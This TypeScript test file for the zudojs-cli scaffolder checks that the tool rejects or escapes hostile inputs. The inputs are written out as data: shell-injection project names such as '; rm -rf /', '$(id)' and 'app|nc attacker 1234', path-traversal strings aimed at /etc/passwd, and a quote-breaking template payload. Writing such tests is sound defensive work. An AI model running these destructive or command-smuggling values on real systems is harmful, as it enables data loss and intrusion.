/**
 * zudojs-cli — Adversarial input tests.
 *
 * Every case here uses a real malicious value: a project name that traverses
 * out of the working directory, names carrying shell metacharacters, an
 * option interpolated into a generated path, a template variable containing a
 * quote, and a target directory that already holds the user's work.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { runCreateCommand } from "../src/commands/create.command.js";
import { runGenerateCommand } from "../src/commands/generate.command.js";
import { FullstackComposer } from "../src/generators/fullstack/fullstackComposer.core.js";
import { writeFileTree, writeFile } from "../src/utils/utils.fileSystem.js";
import { generateEvent } from "../src/generators/event/event.generator.js";
import { generateModule } from "../src/generators/module/module.generator.js";
import type { CLIContext } from "../src/cliType/cliType.type.js";
import type { ProjectConfiguration } from "../src/types/index.js";

vi.mock("../src/utils/utils.exec.js", () => ({
  execCommand: vi.fn(async () => ({ stdout: "", stderr: "" })),
  runStreaming: vi.fn(async () => {}),
}));

function createContext(overrides?: Partial<CLIContext>): CLIContext {
  const logger = {
    debug: () => {},
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    trace: () => {},
    fatal: () => {},
    child: () => logger,
    level: 3,
    flush: () => {},
  };

  return {
    args: [],
    values: {},
    cwd: tmpdir(),
    env: {},
    logger: logger as unknown as CLIContext["logger"],
    ...overrides,
  };
}

/* -------------------------------------------------------------------------- */
/* Project names                                                              */
/* -------------------------------------------------------------------------- */

describe("zudojs create — hostile project names", () => {
  const hostile = [
    "../../etc/passwd",
    "..",
    "../sibling",
    "/etc/passwd",
    "a/b",
    "a\\b",
    "; rm -rf /",
    "app; rm -rf ~",
    "`whoami`",
    "$(id)",
    "app$(touch /tmp/zudojs-pwned)",
    "app|nc attacker 1234",
    "app\nrm -rf /",
    "app\0evil",
  ];

  for (const name of hostile) {
    it(`rejects ${JSON.stringify(name)}`, async () => {
      const context = createContext({ values: { "project-name": name } });
      await expect(runCreateCommand(context)).rejects.toThrow(
        /Project name/i,
      );
    });
  }

  it("refuses to overwrite an existing directory", async () => {
    const root = mkdtempSync(join(tmpdir(), "zudojs-existing-"));
    const existing = join(root, "my-app");
    mkdirSync(existing);
    writeFileSync(join(existing, "important.txt"), "do not delete me");

    try {
      const context = createContext({
        cwd: root,
        values: { "project-name": "my-app" },
      });

      await expect(runCreateCommand(context)).rejects.toThrow(
        /already exists/i,
      );

      // The user's file must still be there.
      expect(() => rmSync(join(existing, "important.txt"))).not.toThrow();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

/* -------------------------------------------------------------------------- */
/* Service names                                                              */
/* -------------------------------------------------------------------------- */

describe("zudojs create — hostile service names", () => {
  for (const service of ["../../evil", "a b", "svc;rm -rf /", "$(id)"]) {
    it(`rejects --services ${JSON.stringify(service)}`, async () => {
      const context = createContext({
        args: ["--services", service],
        values: {
          "project-name": "my-app",
          architecture: "microservice",
          services: service,
        },
      });

      await expect(runCreateCommand(context)).rejects.toThrow(
        /Invalid service name/i,
      );
    });
  }
});

/* -------------------------------------------------------------------------- */
/* generate                                                                   */
/* -------------------------------------------------------------------------- */

describe("zudojs generate — hostile option values", () => {
  it("rejects a --service that would escape the base path", async () => {
    const context = createContext({
      values: { schematic: "command", name: "create-user", service: ".." },
    });

    await expect(runGenerateCommand(context)).rejects.toThrow(/--service/);
  });

  it("rejects a traversing --service", async () => {
    const context = createContext({
      values: {
        schematic: "query",
        name: "get-user",
        service: "../../../tmp/evil",
      },
    });

    await expect(runGenerateCommand(context)).rejects.toThrow(/--service/);
  });

  it("rejects a traversing --module", async () => {
    const context = createContext({
      values: { schematic: "controller", name: "user", module: "../../etc" },
    });

    await expect(runGenerateCommand(context)).rejects.toThrow(/--module/);
  });

  it("rejects a resource name that normalizes to nothing", async () => {
    const context = createContext({
      values: { schematic: "event", name: "..." },
    });

    await expect(runGenerateCommand(context)).rejects.toThrow(
      /at least one letter or digit/i,
    );
  });

  it("normalizes a traversing resource name into a single safe segment", async () => {
    const files = await generateEvent(
      { name: "../../etc/passwd", basePath: "src", dryRun: true },
      "/nonexistent",
    );

    for (const file of files) {
      expect(file).not.toContain("..");
      expect(file.startsWith("src/")).toBe(true);
    }
  });

  it("rejects a module name that normalizes to nothing", async () => {
    await expect(
      generateModule({ name: "///", basePath: "src", dryRun: true }, "/tmp"),
    ).rejects.toThrow(/at least one letter or digit/i);
  });
});

/* -------------------------------------------------------------------------- */
/* Path traversal in the file writer                                          */
/* -------------------------------------------------------------------------- */

describe("writeFileTree path guard", () => {
  let root: string;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "zudojs-write-"));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it("refuses to write above the base path", async () => {
    await expect(
      writeFile(root, "../escaped.txt", "nope"),
    ).rejects.toThrow(/Path traversal/);
  });

  it("refuses a traversing entry inside a file tree", async () => {
    await expect(
      writeFileTree(root, { "a/../../escaped.txt": "nope" }),
    ).rejects.toThrow(/Path traversal/);
  });
});

/* -------------------------------------------------------------------------- */
/* Template injection                                                         */
/* -------------------------------------------------------------------------- */

describe("FullstackComposer template escaping", () => {
  it("cannot be broken out of by a quote in the project name", async () => {
    const composer = new FullstackComposer();

    const project: ProjectConfiguration = {
      name: 'evil"; process.exit(1); //',
      type: "fullstack",
      backend: { architecture: "monolith", api: "rest" },
      workspace: { packageManager: "pnpm" },
    };

    const root = mkdtempSync(join(tmpdir(), "zudojs-tpl-"));
    try {
      const result = await composer.generate({
        project,
        projectPath: root,
      });
      expect(result.success).toBe(true);

      const config = await import("node:fs/promises").then((fs) =>
        fs.readFile(join(root, "zudojs.config.ts"), "utf-8"),
      );

      // The name must be a single JSON string literal, so the injected
      // statement stays inert data rather than becoming code.
      expect(config).toContain(
        `name: ${JSON.stringify('evil"; process.exit(1); //')}`,
      );
      expect(config).not.toContain('name: "evil"; process.exit(1); //"');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("escapes a newline and a backslash in the project name", async () => {
    const composer = new FullstackComposer();
    const root = mkdtempSync(join(tmpdir(), "zudojs-tpl2-"));

    try {
      await composer.generate({
        project: {
          name: "a\\b\nname: \"hijacked\",\n//",
          type: "fullstack",
          backend: { architecture: "monolith", api: "rest" },
          workspace: { packageManager: "pnpm" },
        },
        projectPath: root,
      });

      const config = await import("node:fs/promises").then((fs) =>
        fs.readFile(join(root, "zudojs.config.ts"), "utf-8"),
      );

      // A single-line literal: no raw newline escaped out of the string.
      expect(config).toContain('name: "a\\\\b\\nname: \\"hijacked\\",\\n//"');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
